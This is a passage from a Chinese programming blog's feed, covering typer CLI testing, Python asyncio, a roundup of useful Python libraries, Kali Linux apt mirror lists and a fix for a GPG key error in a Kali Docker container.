class="hljs-keyword">in</span> result.stdout</span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Let&#x27;s have a coffee in Berlin&quot;</span> <span class="hljs-keyword">in</span> result.stdout</span></code></pre></div></div><h3 id="测试输入"><a href="#测试输入" class="headerlink" title="测试输入"></a>测试输入</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> typer.testing <span class="hljs-keyword">import</span> CliRunner</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> .main <span class="hljs-keyword">import</span> app</span><span class="line"></br></span><span class="line">runner = CliRunner()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_app</span>():</span></span><span class="line">    result = runner.invoke(app, [<span class="hljs-string">&quot;Camila&quot;</span>], <span class="hljs-built_in">input</span>=<span class="hljs-string">&quot;camila@example.com\n&quot;</span>)</span><span class="line">    <span class="hljs-keyword">assert</span> result.exit_code == <span class="hljs-number">0</span></span><span class="line">    <span class="hljs-keyword">assert</span> <span class="hljs-string">&quot;Hello Camila, your email is: camila@example.com&quot;</span> <span class="hljs-keyword">in</span> result.stdout</span></code></pre></div></div><h2 id="关于打包"><a href="#关于打包" class="headerlink" title="关于打包"></a>关于打包</h2><ul><li><a href="https://typer.tiangolo.com/tutorial/package/">这里</a>是typer里面提供的打包方法</li><li><a href="/2022/02/24/poetry-%E5%8C%85%E7%AE%A1%E7%90%86%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/" title="poetry 包管理使用方法">poetry 包管理使用方法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 异步IO</title>
      <link href="/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/"/>
      <url>/2022/02/22/python-%E5%BC%82%E6%AD%A5IO/</url>
      
        <content type="html"><![CDATA[<p>相比于多线程，协程或者叫微线程(coroutine)，这样的方式效率更高，因为没有切换线程的开销，不存在变量冲突和进程锁等限制。<br>因为协程是一个线程执行，那怎么利用多核CPU呢？最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> threading</span><span class="line"><span class="hljs-keyword">import</span> asyncio</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_thread</span>(<span class="hljs-params">th</span>):</span></span><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(th)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>]</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hello</span>():</span></span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello world! (%s)&#x27;</span> % threading.currentThread())</span><span class="line">    r = <span class="hljs-keyword">await</span> print_thread(threading.currentThread())</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello %s&#x27;</span> % r)</span><span class="line">    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)</span><span class="line">    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello again! (%s)&#x27;</span> % threading.currentThread())</span><span class="line"></br></span><span class="line">loop = asyncio.get_event_loop()</span><span class="line">tasks = [hello(), hello()]</span><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><span class="line">loop.close()</span></code></pre></div></div><p>执行结果</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-lisp codeBlockLines"><span class="line">Hello world! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello Main</span><span class="line">Hello world! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello Main</span><span class="line">(暂停<span class="hljs-number">1</span>秒)</span><span class="line">Hello again! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span><span class="line">Hello again! (<span class="hljs-name">&lt;_MainThread</span>(<span class="hljs-name">MainThread</span>, started <span class="hljs-number">12448</span>)&gt;)</span></code></pre></div></div><p>可以看到，使用的是一个进程。</p><ol><li><code>async</code>标记把一个<code>generator</code>标记为<code>coroutine</code>类型</li><li>从<code>asyncio</code>模块中直接获取一个<code>EventLoop</code>的引用，然后把需要执行的协程扔到<code>EventLoop</code>中执行，就实现了异步IO。</li><li><code>await</code> 等同于 <code>yeild from</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 实用库收集</title>
      <link href="/2022/02/18/python-%E5%AE%9E%E7%94%A8%E5%BA%93%E6%94%B6%E9%9B%86/"/>
      <url>/2022/02/18/python-%E5%AE%9E%E7%94%A8%E5%BA%93%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>这篇文章是将自己在浏览源码的时候见到的一些库收集起来备忘。</p><h2 id="inspect-检查现场对象"><a href="#inspect-检查现场对象" class="headerlink" title="inspect 检查现场对象"></a>inspect <strong>检查现场对象</strong></h2><ul><li><a href="https://blog.csdn.net/NeverLate_gogogo/article/details/107752428">快速上手</a></li></ul><p>inspect 模块也被称为 检查现场对象。这里的重点在于 “现场” 二字，也就是当前运行的状态。<br>inspect 模块提供了一些函数来了解现场对象，包括 模块、类、实例、函数和方法。<br>inspect 函数主要用于以下四个方面: </p><ol><li>对是否是模块、框架、函数进行类型检查</li><li>获取源码</li><li>获取类或者函数的参数信息</li><li>解析堆栈</li></ol><h2 id="mock-虚假值测试"><a href="#mock-虚假值测试" class="headerlink" title="mock 虚假值测试"></a>mock <strong>虚假值测试</strong></h2><p>用于测试的模块pytest-mock，将方法屏蔽掉并给出虚假的返回值。</p><h2 id="schema-验证输入"><a href="#schema-验证输入" class="headerlink" title="schema 验证输入"></a>schema <strong>验证输入</strong></h2><ul><li><a href="https://segmentfault.com/a/1190000011777230">快速上手</a></li></ul><p>不管我们做什么应用，只要和用户输入打交道，就有一个原则 – 永远不要相信用户的输入数据。意味着我们要对用户输入进行严格的验证，web 开发时一般输入数据都以 JSON 形式发送到后端 API，API 要对输入数据做验证。一般我都是加很多判断，各种if，导致代码很丑陋，能不能有一种方式比较优雅的验证用户数据呢？Schema就派上用场了。</p><h2 id="eviron-config-设置和获取变量"><a href="#eviron-config-设置和获取变量" class="headerlink" title="eviron-config 设置和获取变量"></a>eviron-config <strong>设置和获取变量</strong></h2><ul><li><a href="https://github.com/hynek/environ-config">快速上手</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> environ</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># Extracts secrets from Vault-via-envconsul: &#x27;secret/your-app&#x27;:</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>vault = environ.secrets.VaultEnvSecrets(vault_prefix=<span class="hljs-string">&quot;SECRET_YOUR_APP&quot;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>@environ.config(prefix=<span class="hljs-string">&quot;APP&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AppConfig</span>:</span></span><span class="line"><span class="hljs-meta">... </span>   @environ.config</span><span class="line"><span class="hljs-meta">... </span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DB</span>:</span></span><span class="line"><span class="hljs-meta">... </span>       name = environ.var(<span class="hljs-string">&quot;default_db&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       host = environ.var(<span class="hljs-string">&quot;default.host&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       port = environ.var(<span class="hljs-number">5432</span>, converter=<span class="hljs-built_in">int</span>)  <span class="hljs-comment"># Use attrs&#x27;s converters and validators!</span></span><span class="line"><span class="hljs-meta">... </span>       user = environ.var(<span class="hljs-string">&quot;default_user&quot;</span>)</span><span class="line"><span class="hljs-meta">... </span>       password = vault.secret()</span><span class="line">...</span><span class="line"><span class="hljs-meta">... </span>   env = environ.var()</span><span class="line"><span class="hljs-meta">... </span>   lang = environ.var(name=<span class="hljs-string">&quot;LANG&quot;</span>)  <span class="hljs-comment"># It&#x27;s possible to overwrite the names of variables.</span></span><span class="line"><span class="hljs-meta">... </span>   db = environ.group(DB)</span><span class="line"><span class="hljs-meta">... </span>   awesome = environ.bool_var()</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg = environ.to_config(</span><span class="line"><span class="hljs-meta">... </span>    AppConfig,</span><span class="line"><span class="hljs-meta">... </span>    environ=&#123;</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_ENV&quot;</span>: <span class="hljs-string">&quot;dev&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_DB_HOST&quot;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;LANG&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;APP_AWESOME&quot;</span>: <span class="hljs-string">&quot;yes&quot;</span>,  <span class="hljs-comment"># true and 1 work too, everything else is False</span></span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-comment"># Vault-via-envconsul-style var name:</span></span><span class="line"><span class="hljs-meta">... </span>        <span class="hljs-string">&quot;SECRET_YOUR_APP_DB_PASSWORD&quot;</span>: <span class="hljs-string">&quot;s3kr3t&quot;</span>,</span><span class="line"><span class="hljs-meta">... </span>&#125;)  <span class="hljs-comment"># Uses os.environ by default.</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg</span><span class="line">AppConfig(env=<span class="hljs-string">&#x27;dev&#x27;</span>, lang=<span class="hljs-string">&#x27;C&#x27;</span>, db=AppConfig.DB(name=<span class="hljs-string">&#x27;default_db&#x27;</span>, host=<span class="hljs-string">&#x27;localhost&#x27;</span>, port=<span class="hljs-number">5432</span>, user=<span class="hljs-string">&#x27;default_user&#x27;</span>, password=&lt;SECRET&gt;), awesome=<span class="hljs-literal">True</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>cfg.db.password</span><span class="line"><span class="hljs-string">&#x27;s3kr3t&#x27;</span></span></code></pre></div></div><h2 id="click-替代Argparse"><a href="#click-替代Argparse" class="headerlink" title="click 替代Argparse"></a>click <strong>替代Argparse</strong></h2><ul><li><a href="https://www.cnblogs.com/xiao-apple36/p/9089027.html">快速上手</a></li></ul><p>Python 内置了一个 Argparse 的标准库用于创建命令行，但使用起来有些繁琐，Click 相比于 Argparse，就好比 requests 相比于 urllib。</p><p>常用<code>click.confirm</code>:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> click</span><span class="line"><span class="hljs-keyword">if</span> click.confirm(<span class="hljs-string">&quot;Do you want to kick this off with an Nmap scan?&quot;</span>, default=<span class="hljs-literal">True</span>):</span><span class="line">    dosomething()</span></code></pre></div></div><h2 id="typer-升级版click"><a href="#typer-升级版click" class="headerlink" title="typer 升级版click"></a>typer <strong>升级版click</strong></h2><ul><li><a href="https://typer.tiangolo.com/">快速上手</a></li><li><a href="/2022/02/23/python-typer-%E5%BA%93%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" title="python typer 库使用指南">python typer 库使用指南</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">pip install typer</span><span class="line">pip install typer-cli</span></code></pre></div></div><blockquote><p>你不必总是要编写 CLI 应用程序，但是在编写 CLI 时，最好是无障碍的体验。继 FastAPI 巨大成功之后，Sebastián Ramírez 用同样的原则为我们带来了 Typer：一个新的库，通过利用 Python 3.6+ 的类型提示功能，可以编写命令行界面。</p></blockquote><blockquote><p>这个设计确实使 Typer 脱颖而出。除确保你的代码被正确地记录下来外，你还可以通过最少的努力来获得一个带有验证的 CLI 接口。使用类型提示，你可以在 Python 编辑器中获得自动完成功能（比如 VSCode），从而提高工作效率。</p></blockquote><blockquote><p>为增强 Typer 功能，它的内部是基于 Click 开发的，Click 是非常著名的，并且已经通过了实战检验。这意味着，它可以利用其所有的优点、社区和插件，同时用较少的样板代码从简单的开始，并在需要时添加更多的复杂性。</p></blockquote><blockquote><p>一如既往，它的文档真的很出色，可以作为其他项目的典范。这绝对是不容错过的作品。</p></blockquote><p>但是所有这种类型的CLI都并不好看，并且不支持灵活的颜色方案，所以我将<code>rich</code>和<code>typer</code>结合了一起。</p><p><a href="https://github.com/Elinpf/rich_typer">rich_typer</a>完全兼容typer并且给出了更好的配色方案和样式。自定义程度也更好。</p><h2 id="shlex-简单词法分析"><a href="#shlex-简单词法分析" class="headerlink" title="shlex 简单词法分析"></a>shlex <strong>简单词法分析</strong></h2><ul><li><a href="https://docs.python.org/zh-cn/3/library/shlex.html">快速上手</a></li></ul><p>常用<code>shlex.split</code> 配合<code>subprocess.run</code>:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line">subprocess.run(shlex.split(<span class="hljs-string">&quot;cat sendtext.txt&quot;</span>), stdout=subprocess.PIPE, universal_newlines=<span class="hljs-literal">True</span>) </span></code></pre></div></div><h2 id="rich-彩色富文本"><a href="#rich-彩色富文本" class="headerlink" title="rich 彩色富文本"></a>rich <strong>彩色富文本</strong></h2><p><a href="https://github.com/Textualize/rich/blob/master/README.cn.md">Rich</a> 是一个 Python 库，可以为您在终端中提供富文本和精美格式。</p><p><a href="https://rich.readthedocs.io/en/latest/">Rich API</a> 可以很容易的在终端输出添加各种颜色和不同风格。Rich 还可以绘制漂亮的表格，进度条，markdown，突出显示语法的源代码及回溯等等，不胜枚举。</p><p>另外rich还有个非常漂亮的traceback，<a href="https://rich.readthedocs.io/en/latest/traceback.html#automatic-traceback-handler">这里</a>告诉了如何添加使用。</p><h2 id="tabulate-轻松实现字符表格"><a href="#tabulate-轻松实现字符表格" class="headerlink" title="tabulate 轻松实现字符表格"></a>tabulate <strong>轻松实现字符表格</strong></h2><ul><li><a href="https://python.fasionchan.com/zh_CN/latest/libs/tabulate.html">快速上手</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> tabulate <span class="hljs-keyword">import</span> tabulate</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>table_header = [<span class="hljs-string">&#x27;Name&#x27;</span>, <span class="hljs-string">&#x27;Chinese&#x27;</span>, <span class="hljs-string">&#x27;Math&#x27;</span>, <span class="hljs-string">&#x27;English&#x27;</span>]</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>table_data = [</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Tom&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>, <span class="hljs-string">&#x27;85&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Jim&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>    (<span class="hljs-string">&#x27;Lucy&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;70&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>),</span><span class="line"><span class="hljs-meta">... </span>]</span><span class="line"></br></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(tabulate(table_data, headers=table_header, tablefmt=<span class="hljs-string">&#x27;grid&#x27;</span>))</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Name   |   Chinese |   Math |   English |</span><span class="line">+========+===========+========+===========+</span><span class="line">| Tom    |        <span class="hljs-number">90</span> |     <span class="hljs-number">80</span> |        <span class="hljs-number">85</span> |</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Jim    |        <span class="hljs-number">70</span> |     <span class="hljs-number">90</span> |        <span class="hljs-number">80</span> |</span><span class="line">+--------+-----------+--------+-----------+</span><span class="line">| Lucy   |        <span class="hljs-number">90</span> |     <span class="hljs-number">70</span> |        <span class="hljs-number">90</span> |</span><span class="line">+--------+-----------+--------+-----------+</span></code></pre></div></div><p>中文对齐引入<code>import wcwidth</code></p><h2 id="sanic-极速异步web框架"><a href="#sanic-极速异步web框架" class="headerlink" title="sanic 极速异步web框架"></a>sanic <strong>极速异步web框架</strong></h2><ul><li><a href="https://sanic.dev/zh/guide/getting-started.html#%E5%AE%89%E8%A3%85-install">官方文档</a></li><li><a href="https://www.cnblogs.com/traditional/p/14305650.html">快速上手</a></li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><span class="line"><span class="hljs-keyword">from</span> sanic <span class="hljs-keyword">import</span> (</span><span class="line">    Sanic,</span><span class="line">    request,</span><span class="line">    response</span><span class="line">)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 创建一个 Sanic 实例对象, Sanic 是 web 服务的入口类, 它等价于 flask.Flask</span></span><span class="line"><span class="hljs-comment"># 然后里面传递一个字符串, 为我们的应用起一个名字</span></span><span class="line">app = Sanic(<span class="hljs-string">&quot;sanic_service&quot;</span>)</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 这里通过 @app.get(&quot;路由&quot;) 的方式和一个视图函数进行绑定</span></span><span class="line"><span class="hljs-comment"># 视图函数中的 request 参数会接收一个 sanic.request.Request 实例对象, 它包含了接收到的请求中的所有信息</span></span><span class="line"><span class="hljs-comment"># 比如我们想获取 url 中的查询参数, 那么就需要通过这里的 request 获取, 这个参数在请求到来时会自动传递</span></span><span class="line"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/index&quot;</span></span>)</span></span><span class="line"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>(<span class="hljs-params">request: request.Request</span>):</span></span><span class="line">    <span class="hljs-comment"># 这个参数我们暂时先不用, 但是一定要有</span></span><span class="line">    <span class="hljs-comment"># 这里直接返回一个字符串</span></span><span class="line">    <span class="hljs-keyword">return</span> response.text(<span class="hljs-string">&quot;hello world&quot;</span>)</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># host: 监听的IP, port: 监听的端口, auto_reload: 修改代码之后是否自动重启</span></span><span class="line">app.run(host=<span class="hljs-string">&quot;127.0.0.1&quot;</span>, port=<span class="hljs-number">8888</span>)</span></code></pre></div></div><h2 id="bpython-代替原生python交互解释器"><a href="#bpython-代替原生python交互解释器" class="headerlink" title="bpython 代替原生python交互解释器"></a>bpython <strong>代替原生python交互解释器</strong></h2><ul><li><p><a href="https://bpython-interpreter.org/">快速上手</a></p></li><li><p><code>Ctrl + R</code> 回退</p></li><li><p><code>F7</code> 从编辑器打开</p></li><li><p><code>F8</code> 将代码复制出来</p></li></ul><h2 id="prompt-toolkit-相当强大的命令行界面工具箱"><a href="#prompt-toolkit-相当强大的命令行界面工具箱" class="headerlink" title="prompt_toolkit 相当强大的命令行界面工具箱"></a>prompt_toolkit <strong>相当强大的命令行界面工具箱</strong></h2><ul><li><a href="https://python-prompt-toolkit.readthedocs.io/en/master/">快速上手</a></li><li><a href="/2022/03/01/%E4%B8%80%E4%B8%AA%E6%9E%81%E7%AE%80%E7%9A%84REPL%E4%BA%A4%E4%BA%92%E7%A4%BA%E8%8C%83/" title="一个极简的REPL交互示范">一个极简的REPL交互示范</a></li></ul><p><code>prompt_toolkit</code>是一个用于在Python中构建强大的交互命令行和终端应用程序的库，同时它也可用于构建全屏应用程序。</p><h2 id="DearPyGui-GUI-框架"><a href="#DearPyGui-GUI-框架" class="headerlink" title="DearPyGui GUI 框架"></a>DearPyGui <strong>GUI 框架</strong></h2><ul><li><a href="https://www.jianshu.com/p/4b69d760c36b">快速上手</a></li><li><a href="https://github.com/hoffstadt/DearPyGui">Github</a></li></ul><p>与其他 Python GUI 库相比，Dear PyGui 具有以下独特之处：</p><ul><li>GPU 渲染</li><li>简单的内置异步功能支持</li><li>完整的主题和样式控制</li><li>简单的内置日志窗口</li><li>70 多个小部件具有数百种小部件组合</li><li>详细的文档，示例和无与伦比的支持</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 收集 </tag>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali apt源</title>
      <link href="/2022/02/18/kali-apt%E6%BA%90/"/>
      <url>/2022/02/18/kali-apt%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>修改<code>/etc/apt/sources.list</code>文件</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line"><span class="hljs-comment">#阿里云</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com/kali kali-rolling main non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#中科大</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#清华大学</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><span class="line">deb-src https:<span class="hljs-regexp">//mi</span>rrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#浙大</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#东软大学</span></span><span class="line">deb http:<span class="hljs-regexp">//mi</span>rrors.neusoft.edu.cn<span class="hljs-regexp">/kali kali-rolling/m</span>ain non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//mi</span>rrors.neusoft.edu.cn<span class="hljs-regexp">/kali kali-rolling/m</span>ain non-free contrib</span><span class="line"></br></span><span class="line"><span class="hljs-comment">#官方源</span></span><span class="line">deb http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib</span><span class="line">deb-src http:<span class="hljs-regexp">//</span>http.kali.org/kali kali-rolling main non-free contrib</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali docker 使用时遇到的坑</title>
      <link href="/2022/02/18/kali-docker-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2022/02/18/kali-docker-%E4%BD%BF%E7%94%A8%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="安装官方的-Docker-Kali-GPG-无法验证"><a href="#安装官方的-Docker-Kali-GPG-无法验证" class="headerlink" title="安装官方的 Docker Kali GPG 无法验证"></a>安装官方的 Docker Kali GPG 无法验证</h2><p>在使用2022.1版本 kalilinux/kali-rolling 的时候，apt update 会报以下验证错误。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">root@28593cafb270:/# apt <span class="hljs-keyword">update</span></span><span class="line">Get:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease [30.6 kB]</span></span><span class="line"><span class="hljs-keyword">Err</span>:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease</span></span><span class="line">  The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span><span class="line">Reading package lists... Done</span><span class="line">W: http:<span class="hljs-comment">//http.kali.org/kali/dists/kali-rolling/InRelease: The key(s) in the keyring /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg are ignored as the file is not readable by user &#x27;_apt&#x27; executing apt-key.</span></span><span class="line">...</span><span class="line">W: GPG <span class="hljs-keyword">error</span>: http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span></span><span class="line"><span class="hljs-keyword">E</span>: The repository &#x27;http:<span class="hljs-comment">//http.kali.org/kali kali-rolling InRelease&#x27; is not signed.</span></span><span class="line"><span class="hljs-keyword">N</span>: Updating from such a repository can&#x27;t be done securely, and is therefore disabled <span class="hljs-keyword">by</span> default.</span><span class="line"><span class="hljs-keyword">N</span>: See apt-secure(8) manpage <span class="hljs-keyword">for</span> repository creation and user configuration details.</span></code></pre></div></div><p>解决办法前往<a href="/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/" title="kali docker apt gpg 验证失败">kali docker apt gpg 验证失败</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker-kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali docker apt gpg 验证失败</title>
      <link href="/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/"/>
      <url>/2022/02/18/kali-docker-apt-gpg-%E9%AA%8C%E8%AF%81%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="错误信息"><a href="#错误信息" class="headerlink" title="错误信息"></a>错误信息</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-stata codeBlockLines"><span class="line">root@28593cafb270:/# apt <span class="hljs-keyword">update</span></span><span class="line">Get:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease [30.6 kB]</span></span><span class="line"><span class="hljs-keyword">Err</span>:1 http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease</span></span><span class="line">  The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span><span class="line">Reading package lists... Done</span><span class="line">W: http:<span class="hljs-comment">//http.kali.org/kali/dists/kali-rolling/InRelease: The key(s) in the keyring /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg are ignored as the file is not readable by user &#x27;_apt&#x27; executing apt-key.</span></span><span class="line">...</span><span class="line">W: GPG <span class="hljs-keyword">error</span>: http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling InRelease: The following signatures couldn&#x27;t be verified because the public key is not available: NO_PUBKEY ED444FF07D8D0BF6</span></span><span class="line"><span class="hljs-keyword">E</span>: The repository &#x27;http:<span class="hljs-comment">//http.kali.org/kali kali-rolling InRelease&#x27; is not signed.</span></span><span class="line"><span class="hljs-keyword">N</span>: Updating from such a repository can&#x27;t be done securely, and is therefore disabled <span class="hljs-keyword">by</span> default.</span><span class="line"><span class="hljs-keyword">N</span>: See apt-secure(8) manpage <span class="hljs-keyword">for</span> repository creation and user configuration details.</span></code></pre></div></div><h2 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6</span></code></pre></div></div><p>但是新docker没有安装<code>gnupg</code>会报<code>E: gnupg, gnupg2 and gnupg1 do not seem to be installed, but one of them is required for this operation</code>错误。</p><p>要想安装<code>gnupg</code>则需要更新apt, 进入死循环</p><h2 id="尝试2"><a href="#尝试2" class="headerlink" title="尝试2"></a>尝试2</h2><p>强行获取密钥然后安装</p><p>方法是下载最新的<code>kali-archive-keyring</code>，由于无法使用apt，所以手动下载。<br>最新的到<code>http://http.kali.org/pool/main/k/kali-archive-keyring</code>查看</p><div class="codeBlockContainer"><div 